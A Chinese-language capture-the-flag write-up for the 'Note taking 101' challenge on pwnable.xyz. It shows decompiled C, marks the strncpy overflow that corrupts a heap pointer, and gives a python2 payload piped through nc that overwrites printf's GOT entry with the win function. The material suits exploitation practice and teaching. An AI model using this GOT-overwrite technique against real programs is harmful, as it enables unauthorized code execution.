ghidra查看代码

```c
undefined8 main(void)

{
  int iVar1;
  
  setup();
  puts("Note taking 101.");
  while( true ) {
    while( true ) {
      while( true ) {
        print_menu();
        iVar1 = read_int32();
        if (iVar1 != 1) break;
        edit_note();
      }
      if (iVar1 != 2) break;
      edit_desc();
    }
    if (iVar1 == 0) break;
    puts("Invalid");
  }
  return 0;
}

void read_int32(void)

{
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  read(0,local_38,0x20);
  atoi(local_38);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void edit_desc(void)

{
  if (s._32_8_ == (void *)0x0) {              // B
    s._32_8_ = malloc(0x20);
  }
  printf("desc: ");
  read(0,s._32_8_,0x20);                      // C
  return;
}

void edit_note(void)

{
  int iVar1;
  char *__src;
  
  printf("Note len? ");
  iVar1 = read_int32();
  __src = (char *)malloc((long)iVar1);
  printf("note: ");
  read(0,__src,(long)iVar1);
  strncpy(s,__src,(long)iVar1);               // A
  free(__src);
  return;
}

void win(void)

{
  system("cat flag");
  return;
}
```

跟上一题类似，通过A行输入一个较长的字符串使得B行条件不成立，达到C行的任意位置写

查看安全参数：
```shell
$ checksec --file challenge
[*] '/home/goevil/share/pwn/challenge_37/image/challenge/challenge'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

GOT保护未开启，可以将printf@plt(0x601238) 的地址改为 win函数地址(0x40093c)

脚本：
*注：函数输入全部为read，注意参数长度*
```shell
$ python2 -c 'print "1"+" "*0x1f+"40"+" "*0x1e+"a"*32+"\x38\x12\x60\x00\x00\x00\x00\x00"+ "2" + " "*0x1f + "\x3c\x09\x40\x00\x00\x00\x00\x00" + "a"*24' > input.txt
$ nc svc.pwnable.xyz 30016 < input.txt
```
